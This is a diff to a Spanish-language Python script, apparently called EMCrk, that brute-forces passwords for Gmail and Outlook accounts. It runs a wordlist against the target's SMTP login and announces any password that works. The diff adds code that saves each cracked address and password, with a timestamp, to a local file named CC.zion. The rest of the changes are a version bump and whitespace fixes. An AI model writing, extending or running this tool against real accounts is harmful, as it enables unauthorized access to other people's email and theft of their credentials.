@@ -1,4 +1,4 @@
-# -*- coding: utf-8 -*-
+﻿# -*- coding: utf-8 -*-
 #                                                               
 #        `7MM'""YMM  `7MMM.     ,MMF' .g8'""bgd       `7MM      
 #          MM    `7    MMMb    dPMM .dP'     `M         MM      
@@ -13,6 +13,7 @@
 from BannerEMCrk import Banner
 import os.path as path
 import smtplib
+import time
 import os
 
 
@@ -20,13 +21,10 @@ os.system('cls')
 
 
 autor = "By: LawlietJH"
-version = "v_1.0.3"
-
-#sufijo = ""
-#Usuario = ""
+version = "v_1.0.4"
 
 #GMCrk - Banner Random
-banner = str(Banner()+"\n\n\t\t [-] Obtener Contraseñas de Outlook o Gmail [-] \n\n")
+banner = str(Banner()+"\n\n\t\t [-] Obtener Contraseñas de Outlook o Gmail [-] \n")
 print (banner)
  
 def Correo():
@@ -38,12 +36,12 @@ def Correo():
 
 	# Ejemplos de uso para endswitch: 
 	# X.lower().endswith(('.png', '.jpg', '.jpeg')) 
-    # Con esto busca si tiene alguna de esas extensiones la variable X.
-    # Esto es útil si puede haber mas de una extension posible.
-    # Se suple más fácil cuando solo se quiere validar una sola extensión .
-    # Ejemplo: if '.txt' in X: El problema de esto es que eso lo puede tomar como
-    # valido aunque se encontrara como en xt.txtxt esto no deberia ser valido :v
-    # pero lo tomaria como valido.
+	# Con esto busca si tiene alguna de esas extensiones la variable X.
+	# Esto es útil si puede haber mas de una extension posible.
+	# Se suple más fácil cuando solo se quiere validar una sola extensión .
+	# Ejemplo: if '.txt' in X: El problema de esto es que eso lo puede tomar como
+	# valido aunque se encontrara como en xt.txtxt esto no deberia ser valido :v
+	# pero lo tomaria como valido.
 	
 	if Usuario.lower().endswith('@gmail.com'):
 		sufijo = "gmail"
@@ -131,6 +129,19 @@ def Conexion():
 		try:
 			smtpserver.login(Usuario, Pwd)
 			print (" ------> [!] Contraseña Encontrada: " + str(Pwd))
+			
+			passwd=open('CC.zion','a')
+			
+			FechaF = time.strftime("\n\n\t [*] Fecha: %d/%m/%Y %H:%M:%S")
+			xD="\n\t"+FechaF+\
+			   "\n\t ------------------------------------------------- "+\
+			   "\n\n\t [+] Correo: "+str(Usuario)+"\n\n\t [+] Contraseña: "+str(Pwd)+\
+			   "\n\t ------------------------------------------------- "
+			passwd.write(xD)
+			passwd.close()
+			print("\n\n\n\n\t [!] La Contraseña ha sido exitosamente encontrada.")
+			print("\n\t [+] Fue Guardada En El Archivo CC.zion.")
+			
 			os.system('Timeout /nobreak 03 > Nul')
 			exit(0)
 		except smtplib.SMTPAuthenticationError:
@@ -138,6 +149,8 @@ def Conexion():
 	
 
 def main():
+	
+	print(time.strftime("\n\n\t [!] Iniciado: %d/%m/%Y %H:%M:%S"))
 	Correo()
 	Diccionario()
 	Conexion()
